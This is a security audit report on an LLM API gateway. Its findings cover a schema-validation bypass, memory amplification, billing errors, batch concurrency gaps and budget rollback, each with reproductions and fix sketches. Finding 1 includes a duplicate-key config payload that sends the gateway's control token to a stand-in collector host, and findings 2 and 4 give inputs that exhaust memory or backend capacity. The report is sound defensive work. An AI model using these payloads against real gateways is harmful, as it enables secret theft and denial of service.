# kaiak gateway audit

Date: 2026-09-25. Source: `/tmp/kaiak` (plain copy; no commit identifier).

The gateway has a substantial, passing test suite and generally careful accounting and lifecycle design. I found **two high-severity and five medium-severity issues**. The high-severity issues are a schema-validation bypass that defeats the explicit gateway-secret protection, and request rewriting that defeats the documented memory bound. These should be fixed before exposing the proposed shared deployment to untrusted key holders or accepting independently implemented control-plane config feeds.

Scope: gateway, its protocol implementation and shared schemas/fixtures; control code only where needed to understand the counterpart. Control-plane storage durability is not assessed. References below are to the original source, with one-based line numbers. No source file was changed.

## Verification and evidence

All execution took place in `/tmp/kaiak-audit/work`, an isolated copy. Baseline verification finished before audit-specific tests were added there:

- Gateway `go test -race ./...`: passed, including gateway e2e.
- Control `npm ci && npm test && npm run lint`: passed; 462 tests, 32 suites.
- `scripts/check-all.sh`: passed, including formatting, vet, staticcheck, gateway race tests, live-test-kit self-tests, control tests/lint and cross-half e2e with the sample control plane and two gateways. Final output: `all checks passed`.
- Audit-only reproductions: `go test -race ./internal/limits ./internal/control ./internal/provider ./internal/server -run '^TestAudit' -count=1 -v`: passed. Here “passed” means the assertions demonstrated the reported defects. These tests are evidence, not fixes.

Logs: [full suite](check-all.log), [gateway race suite](gateway-race.log), [control tests](control-test.log), [control lint](control-lint.log), [reproductions](reproductions.log), [source integrity](source-integrity.log). Reproduction sources are the four `internal/{limits,control,provider,server}/audit_test.go` files under [the isolated gateway copy](work/gateway).

Runtime: Go 1.27.1, Node 26.9.0, npm 11.19.1, macOS/arm64. Initial sandbox restrictions prevented loopback tests and dependency fetching; authorized reruns completed successfully. No real Azure account, GPU/vLLM host, Kubernetes cluster, or container deployment was exercised. Resource-exhaustion checks used bounded inputs; I did not intentionally OOM a process. Race-detector success applies to executed paths, not every possible interleaving.

## Findings, highest severity first

### 1. High — duplicate config objects bypass schema checks and the reserved-secret restriction

**Locations:** `gateway/internal/config/snapshot.go:275`, `gateway/internal/schemacheck/schemacheck.go:42`, `gateway/internal/config/schema.go:164`, `gateway/internal/config/loader.go:147`, `gateway/internal/provider/openai.go:234`.

**What is wrong:** `Parse` validates a generic JSON tree, then independently decodes the original bytes into a typed document. Generic decoding replaces a duplicate object's previous value; typed decoding into an existing map merges entries across duplicate occurrences. The snapshot can therefore contain backend entries that the schema checker never examined. The credential check subsequently tests only whether the named environment variable exists. The provider reads that variable and sends it to the configured backend.

**Concrete scenario:** Send a config with two top-level `backends` members. The first contains:

```json
{"sneaky":{"type":"openai-compatible","base_url":"https://collector.example/v1","api_key_env":"KAIAK_CONTROL_TOKEN"}}
```

The second contains ordinary valid backends. A model in the config references `sneaky`. The schema checker sees only the second map. The typed decoder retains `sneaky`; semantic reference checking succeeds. `config.Check` accepts the config when the named environment variable is set. A request routed to that model sends the gateway's control token to the collector as its backend authorization credential. The same mechanism defeats other structural checks on hidden entries.

The executed reproduction returned `validated backend=sneaky ... secret env=KAIAK_CONTROL_TOKEN`. It used only a dummy credential and did not transmit a real secret.

**Threat boundary:** Requires the ability to supply raw config bytes through a file or authenticated control-plane feed; an ordinary API key alone is insufficient. The standard TypeScript counterpart's parse/serialization can remove duplicates, so this is not a demonstrated exploit through its normal config publication API. It is nevertheless a gateway-side bypass of an explicit restriction meant to keep config authors from accessing gateway-owned tokens, and a Go/JSON-schema interpretation mismatch.

**Fix sketch:** Decode once, validate that representation, and construct the snapshot from exactly that representation; alternatively reject duplicate object members recursively before both decoders run. Keep the reserved `KAIAK_` check at the final credential-use boundary as well. Add raw-byte duplicate-member fixtures to both halves; ordinary JSON fixture decoding alone hides this class of discrepancy.

**Confidence:** Confirmed by running `TestAuditDuplicateConfigBypassesReservedSecret` and reading credential forwarding.

### 2. High — duplicate owned request fields amplify memory outside the body budget

**Locations:** `gateway/internal/server/inbound.go:56`, `gateway/internal/provider/body.go:80`, `gateway/internal/provider/body.go:126`, `gateway/internal/provider/openai.go:255`, `gateway/internal/config/schema.go:20`. Contract: `docs/specs/GATEWAY.md:183`; sizing guidance: `docs/DEPLOYMENT.md:169`.

**What is wrong:** The inbound parser accepts repeated `model` members. The passthrough editor indexes and replaces every occurrence with the deployment name. The raw body is budgeted, but the expanded provider body and indexing/splice allocations are not. A short public alias mapping to a long backend model name yields far more than the documented approximately twice-body-budget peak.

**Concrete scenario:** A valid key sends a JSON object containing 10,000 occurrences of `"model":"m"` to an allowed alias whose backend model name has 512 characters, which the config schema permits. The reproduction expanded **120,015 input bytes to 5,230,015 bytes: 43.6×**, before accounting for temporary indexing, decoding and slice-growth allocations. A near-4-MiB input of the same shape produces roughly 174 MiB of final rewritten body alone. With permissive token limits, 16 concurrent requests allowed to one key can exceed a 1.5-GiB pod's memory while consuming at most 64 MiB of the default 512-MiB raw-body budget. Multiple keys add another route to concurrency. Backend rejection of the request happens after this allocation.

An OOM here also loses unacknowledged usage in the intended stateless deployment. Exact RSS and a crash were not measured; the expansion itself was.

**Fix sketch:** Reject duplicate gateway-owned fields, or collapse them to one owned field while preserving unknown members. Calculate and reserve the rewritten size before allocating, with a hard bound on transformed bytes and structural indexing overhead. Update the memory guidance to cover remaining unbudgeted allocations. Keep a bounded amplification regression test.

**Confidence:** Confirmed by running `TestAuditRepeatedModelExpansion`; OOM impact follows from measured expansion and configured concurrency, rather than a destructive OOM test.

### 3. Medium — known backend error statuses become billable “unanswered” attempts if the first body read fails

**Locations:** `gateway/internal/provider/openai.go:101`, `gateway/internal/provider/openai.go:128`, `gateway/internal/server/upstream.go:167`, `gateway/internal/server/upstream.go:201`, `gateway/internal/accounting/meter.go:106`, `gateway/internal/accounting/meter.go:182`.

**What is wrong:** The provider obtains HTTP headers but does not return the response until its first body/event read. If that read fails, it returns only `CodeUnavailable`, discarding the status. Except for specially handled credential/model refusals, the server never calls `meter.Answered`. A fully written request is consequently charged estimated input even when the backend has already explicitly refused it. Retry classification also loses the distinction between a connection failure, caller error, overload and server failure.

**Concrete scenario:** A backend receives a request, sends HTTP 429 with `Content-Length: 100`, flushes headers and closes without sending the body. With one attempt, the executed full-handler test produced **client HTTP 502, 16 charged input tokens and 16,000 nano-USD**, despite the known 429. With retries enabled, the request can follow unavailable-error retry behavior rather than excluding the rate-limited deployment; each similarly failed attempt can add another estimated input charge. Truncated ordinary 4xx responses can likewise become retryable unavailable errors.

**Fix sketch:** Preserve received HTTP status independently of body-read success. Notify accounting and retry classification as soon as error headers arrive. It is fine to sanitize a broken error response to a gateway error for the client; it must retain the known refusal for accounting and routing. Cover truncated 400/429/500 bodies and first-read timeouts after error headers.

**Confidence:** Confirmed by running provider-level `TestAuditErrorHeadersLostBeforeFirstBody` and full-handler `TestAuditTruncated429ChargesInput`; retry consequence confirmed by reading the decision path.

### 4. Medium — batching bypasses the intended bound on backend generation concurrency

**Locations:** `gateway/internal/server/inbound.go:117`, `gateway/internal/server/inbound.go:138`, `gateway/internal/server/limits.go:23`, `gateway/internal/routing/routing.go:413`, `gateway/internal/routing/routing.go:460`. Deployment guidance: `docs/DEPLOYMENT.md:281`.

**What is wrong:** `max_n` caps generation multiplicity per prompt, but there is no cap on a completions prompt batch's total generation count. Backend capacity and per-key concurrency count HTTP requests, regardless of that total. The gateway already calculates the prompt-count product for output-token reservations but does not use it for capacity admission. The recommendation to set backend `max_in_flight` to vLLM's sequence capacity does not account for this difference.

**Concrete scenario:** `POST /v1/completions` with 10,000 short string prompts, `n:1`, and `max_tokens:1` is accepted by inbound parsing under `max_n:8`. The reproduction's body was **40,045 bytes** and its recognized generation count **10,000**. Its token reservation is only about 20,012 tokens, so even a 60,000-token allowance can admit it. Routing charges one backend slot. On a compatible backend accepting batch prompts, that one request introduces 10,000 generation jobs, defeating the gateway's attempt to keep waiting work in its own bounded queues. This can congest a host for other teams; least-request routing also understates its load. A backend's own batch cap may mitigate the consequence but is not enforced here.

**Fix sketch:** Add a cap on total generated sequences and batch cardinality, including embeddings where appropriate. If backend capacity is intended to represent sequences, reserve weighted slots using the already-computed multiplicity and define fair handling for batches. Otherwise explicitly document the HTTP-request unit and require conservative backend batch limits instead of equating the cap with sequence capacity.

**Confidence:** Gateway acceptance confirmed by `TestAuditBatchMultiplicityExceedsMaxN`; single-slot accounting confirmed by reading routing. Live backend congestion is plausible, conditional on its batch behavior; not load-tested against vLLM.

### 5. Medium — a delayed previous-process totals message can roll back current budget totals

**Locations:** `gateway/internal/control/messages.go:71`, `gateway/internal/control/client.go:337`, `gateway/internal/control/client.go:355`. Contract: `docs/specs/CONTROL-PROTOCOL.md:212`.

**What is wrong:** Any different `control_plane` process ID is considered newer than the current revision. Config streaming and usage sending run concurrently, so an old-process usage acknowledgment can arrive after a new-process stream's totals. There is no retired-process check. A→B→A is accepted as two restarts rather than a rollback. This follows the current protocol rule: the contract itself needs refinement, not just the comparison expression.

**Concrete scenario:** Process A prepares totals of 100 at sequence 10; after more usage and a restart, B sends authoritative totals of 200 at sequence 1. A buffered acknowledgment from A then arrives with 150 at sequence 11. All three snapshots have the same config identity. The gateway applies **100 → 200 → 150**, reopening budget that was already spent; stale `live_gateways` can also increase per-replica shares. This requires no loss of authoritative control-plane storage: a delayed response from the old process suffices. The window ends when another current-process update arrives, but valid admissions can happen in between.

**Fix sketch:** Establish the active process epoch through a defined synchronization path and reject snapshots from retired epochs. A durable monotonic term is another option. Define acknowledgment retirement separately from snapshot replacement so rejecting stale totals cannot cause double counting or incorrectly retire local usage. Add an overlapping restart/ack/stream test with nonzero `counted_through`.

**Confidence:** Confirmed by running `TestAuditDelayedPreviousProcessTotalsReapply`, which applied `[100 200 150]`. The transport arrival sequence is plausible and supported by independent sender/stream goroutines; no distributed restart timing test was needed to demonstrate the comparator defect.

### 6. Medium — price removal between request snapshot and admission skips USD enforcement for a still-billable request

**Locations:** `gateway/internal/server/api.go:144`, `gateway/internal/server/limits.go:30`, `gateway/internal/limits/limits.go:361`, `gateway/internal/limits/limits.go:419`, `gateway/internal/limits/limits.go:476`, `gateway/internal/accounting/accounting.go:126`.

**What is wrong:** Accounting uses the request's model snapshot and arrival time for cost. The limiter receives only the model name and decides whether USD counters apply from the current live model/prices. A request that captured a paid model before a reload can therefore be charged under old prices while admission and settlement treat it as free. Only counters present in the reservation are settled.

**Concrete scenario:** A team's $1 monthly budget is exhausted. A request captures the paid model snapshot and is still reading its body. Config reload removes the model's prices. The request completes its body and reaches limits: no USD counter is attached, so it is admitted. It then routes using the old snapshot and produces another $0.20 charge. In the reproduction, the local counter remained **$1.00 rather than $1.20**. The emitted usage is still reportable to the control plane, but later reporting cannot undo the admission, and file-mode local enforcement never receives that settlement. The same mismatch can omit the applicable USD outage check.

**Fix sketch:** Keep live limit definitions, but pass the request's actual billability/price context into admission. Attach applicable USD counters whenever the request can settle a paid record under its captured snapshot. Test reloads both before admission and after reservation, including priced→free, free→priced and model removal.

**Confidence:** Limiter omission confirmed by `TestAuditPriceChangeSkipsOldRequestMoneyCounter`; request-snapshot and cost-path connection confirmed by reading code. The paused-body reload sequence was not separately exercised over HTTP.

### 7. Medium — forward then corrected control-plane windows invalidate holds without invalidating their identity

**Locations:** `gateway/internal/limits/window.go:68`, `gateway/internal/limits/window.go:102`, `gateway/internal/limits/window.go:213`, `gateway/internal/limits/window.go:272`, `gateway/internal/limits/window.go:163`.

**What is wrong:** A reservation identifies its fixed window only by the start timestamp. Advancing to a pushed future window clears its holds. The supported clock-correction path can then reset to the original timestamp. An old reservation now appears current again, so settlement subtracts a hold that no longer exists. The negative internal count interacts with `MaxInt64-a` in saturating addition and turns into maximum usage, blocking legitimate requests.

**Concrete scenario:** At gateway time 10:30, reserve 900 tokens in a 1,000-token hourly window beginning 10:00. Apply a 12:00 totals window and let the counter roll, clearing the hold. Apply corrected 10:00 totals. Settle the original request with 10 tokens. The executed reproduction reads **9,223,372,036,854,775,807 used**, and even a one-token request is refused. This is a denial of service after clock correction, not the under-enforcement initially suspected during investigation. Ordinary monotonic hour rollover does not trigger it.

**Fix sketch:** Give each window incarnation an identity distinct from its timestamp and store that identity in holds. Clearing reservations must invalidate all old holds even if the timestamp later repeats. Test outstanding reservations across future pushes and correction. Strengthen arithmetic invariant checks so an invalid negative state is detected rather than silently converted into effectively permanent exhaustion.

**Confidence:** Confirmed by running `TestAuditClockCorrectionReleasesOldHoldTwice` under the race detector.

## Deployment implications and explicit limitations

These are documented tradeoffs or deployment requirements, not additional hidden-defect findings:

- **Stateless usage is not a durable billing ledger.** Unacknowledged records disappear on OOM, SIGKILL or node loss; the in-memory delivery bound drops old queued records during prolonged delivery failure. A 10,000-record capacity is only about 100 seconds at 100 records/s, and about 10 seconds at 1,000 records/s, before allowing for retries that create additional records. This can happen well before the default 15-minute priced-budget outage cutoff. Assess acceptable missing revenue against actual record rate; the record-drop and pending-delivery alerts need to be operational before launch. Relevant paths: `gateway/internal/control/usage.go`, `gateway/internal/control/spool.go`; documented at `docs/specs/GATEWAY.md:1283` and `docs/DEPLOYMENT.md:155`. This audit does not recast the explicitly accepted undrained-loss design as a bug.
- **Budgets and replica shares are soft.** USD is checked before execution and settled afterward; input tokens are estimated before backend usage arrives; replicas see delayed totals. Concurrent and unreported work can exceed a nominal monthly budget. Per-minute shares and rounded backend-cap shares are not a distributed semaphore. A requirement for a strict fleet-wide dollar ceiling would require a different admission contract. Findings 3, 5 and 6 concern additional incorrect behavior beyond these accepted bounds.
- **Ingress protection remains necessary for unauthenticated traffic.** Header limits and deadlines bound one connection, but `gateway/internal/server/listener.go` does not impose an aggregate pre-authentication connection cap. Many unfinished connections can still consume descriptors and memory before per-key controls apply. Keep the admin port private or authenticated and set explicit ingress connection/rate limits appropriate to the pod. I verified the per-connection protections, but did not perform a public-network connection-flood benchmark or claim a new auth bypass.
- **The Kubernetes drain design is appropriate but needs the documented grace.** The default recommendation is 75 seconds; in-flight work is cut before the final reserved usage-flush interval. Streams longer than the drain allowance will be partial. A failed flush cannot survive a stateless pod's termination. No manifests were requested or produced.
- **Twenty backend hosts are not intrinsically a problematic scale for this design.** Shared connection pools, per-backend caps and local routing are reasonable. Batch weighting in finding 4 and per-key metric cardinality are the more relevant constraints. Long-lived series accumulate across key/model churn until restart by design; select labels deliberately and measure scrape size with representative owner counts. Existing delivery, breaker, queue, mismatch and usage-estimation metrics provide useful alert inputs; they do not prove invoices agree with providers.
- **Azure/vLLM interoperability still needs deployment-specific live validation.** The code covers Azure `/openai/v1` with `api-key`, OpenAI-compatible passthrough, streamed usage, model-name remapping and Azure retry headers. The live-test-kit self-test passed, but no claim is made that a particular Azure resource, vLLM version, model template, tokenizer or batch limit was validated. Verify full and interrupted streams against the exact deployments before relying on reported cost.

## Areas checked and found sound within the tested scope

- Authentication, key expiry/disable checks, model ACLs and early per-key concurrency admission share the request pipeline. Hash-based key lookup, bounded request IDs, credential header selection, response-header allowlisting and sanitized backend failures avoid ordinary client/provider-secret disclosure. Finding 1 is the specific config-boundary exception.
- Ordinary request-size limits, incremental body-budget reservation, header/body/write deadlines, stream-event bounds and slow-reader handling are implemented and tested. The transformed-body exception is finding 2.
- Token/cost handling distinguishes cached input from uncached input, avoids charging reasoning tokens twice, uses request-start prices, flags estimates/partial records, bounds protocol amounts and settles retry attempts through one accounting path. Queued cancellation and failures before a fully sent request have dedicated tests.
- The ordinary same-process totals/ack path uses generation tracking and serialized updates to avoid counting acknowledged usage both locally and in the pushed base. Config mismatch and prolonged outage checks are explicit. Opt-in spool locking, atomic persistence and restart recovery have tests; control-plane durability was excluded.
- Routing slots have idempotent release, queue cancellation and bounded retry behavior. Circuit and half-open trial identity, stale outcomes, model probes, timeout classification and shutdown goroutine handling were inspected; their baseline race/e2e tests passed. No additional supported deadlock or leak finding emerged.
- Protocol-version checks, strict field validation, numeric bounds, semantic references and shared fixtures generally agree across Go and TypeScript. The raw duplicate-object interpretation in finding 1 is a concrete gap beyond those passing fixtures; the cross-process ordering weakness in finding 5 is a protocol contract gap.
- Readiness/liveness separation, SIGTERM drain, stateless startup/seed behavior and usage flush are covered by the code and integration tests. SHA-256 comparison confirmed all **544 original files unchanged**. Final `pgrep -fl "kaiak|fakebackend|sample/src/main"` returned no matches; no audit processes remained.
